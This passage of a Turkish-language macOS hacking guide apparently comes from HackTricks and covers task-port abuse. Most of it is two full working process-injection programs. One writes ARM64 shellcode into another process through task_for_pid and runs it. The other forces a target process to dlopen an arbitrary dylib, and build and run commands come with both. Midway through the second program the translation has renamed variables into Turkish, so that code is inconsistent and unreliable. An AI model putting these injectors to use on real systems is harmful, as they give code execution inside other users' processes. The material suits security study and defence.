// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detaylar>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Görev bağlantısı aracılığıyla thread üzerinde Dylib Enjeksiyonu

macOS'ta **thread'ler**, **Mach** veya **posix `pthread` api** kullanılarak manipüle edilebilir. Önceki enjeksiyonda oluşturduğumuz thread, Mach api kullanılarak oluşturulduğundan **posix uyumlu değil**.

Bir komutu çalıştırmak için **basit bir shellcode enjekte etmek mümkündü** çünkü bu, **posix uyumlu api'lerle çalışmaya gerek duymuyordu**, sadece Mach ile çalışıyordu. **Daha karmaşık enjeksiyonlar** için **thread'in** aynı zamanda **posix uyumlu olması** gerekecektir.

Bu nedenle, **thread'i iyileştirmek** için **`pthread_create_from_mach_thread`** çağrılmalıdır ki bu da **geçerli bir pthread oluşturacaktır**. Sonra, bu yeni pthread **dlopen'ı çağırabilir** ve sistemden bir dylib yükleyebilir, böylece farklı işlemler gerçekleştirmek için yeni shellcode yazmak yerine özel kütüphaneler yüklemek mümkün olacaktır.

Örnek dylib'leri (örneğin bir log oluşturan ve ardından onu dinleyebileceğiniz bir dylib):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(uzakGörev, uzakKod64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının kodu için bellek izinlerinin ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}

// Ayrılan yığın belleğinin izinlerini ayarla
kr  = vm_protect(uzakGörev, uzakYığın64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının yığını için bellek izinlerinin ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}


// Shellcode'u çalıştırmak için iş parçacığı oluştur
struct arm_unified_thread_state uzakThreadState64;
thread_act_t         uzakThread;

memset(&uzakThreadState64, '\0', sizeof(uzakThreadState64) );

uzakYığın64 += (STACK_SIZE / 2); // bu gerçek yığın
//uzakYığın64 -= 8;  // 16'lık hizalamaya ihtiyaç var

const char* p = (const char*) uzakKod64;

uzakThreadState64.ash.flavor = ARM_THREAD_STATE64;
uzakThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
uzakThreadState64.ts_64.__pc = (u_int64_t) uzakKod64;
uzakThreadState64.ts_64.__sp = (u_int64_t) uzakYığın64;

printf ("Uzak Yığın 64  0x%llx, Uzak kod %p\n", uzakYığın64, p );

kr = thread_create_running(uzakGörev, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &uzakThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &uzakThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Uzak iş parçacığı oluşturulamadı: hata %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Kullanım: %s _pid_ _eylem_\n", argv[0]);
fprintf (stderr, "   _eylem_: diskteki bir dylib dosyasının yolu\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *eylem = argv[2];
struct stat buf;

int rc = stat (eylem, &buf);
if (rc == 0) inject(pid,eylem);
else
{
fprintf(stderr,"Dylib bulunamadı\n");
}

}
```
</detaylar>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Görev bağlantısı üzerinden İş Parçası Kaçırma <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bu teknikte, işlemin bir iş parçası kaçırılır:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Temel Bilgiler

XPC, macOS ve iOS'ta **işlemler arasındaki iletişim** için bir çerçevedir. XPC, sistemin farklı işlemleri arasında **güvenli, asenkron yöntem çağrıları yapma mekanizması** sağlar. Apple'ın güvenlik paradigmasının bir parçası olup, her **bileşenin** yalnızca işini yapmak için gereken izinlere sahip olduğu **ayrıcalıklı uygulamaların oluşturulmasına** izin verir, böylece bir işlem etkilenirse olası zararı sınırlar.

Bu **iletişimin nasıl çalıştığı** ve **neden savunmasız olabileceği** hakkında daha fazla bilgi için:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Arayüzü Oluşturucusu

MIG, Mach IPC kodu oluşturma sürecini **kolaylaştırmak için** oluşturulmuştur. Çünkü RPC programlamak için yapılan birçok işlem aynı eylemleri içerir (argümanları paketleme, mesajı gönderme, sunucuda verileri açma...).

MIC, sunucu ve istemcinin belirli bir tanım ile iletişim kurması için **gerekli kodu oluşturur** (IDL -Arayüz Tanım Dili-). Oluşturulan kod ne kadar kötü olursa olsun, bir geliştirici sadece bunu içe aktarması ve kodu öncekinden çok daha basit hale getirmesi gerekir.

Daha fazla bilgi için:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Referanslar

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek katkıda bulunun.

</details>
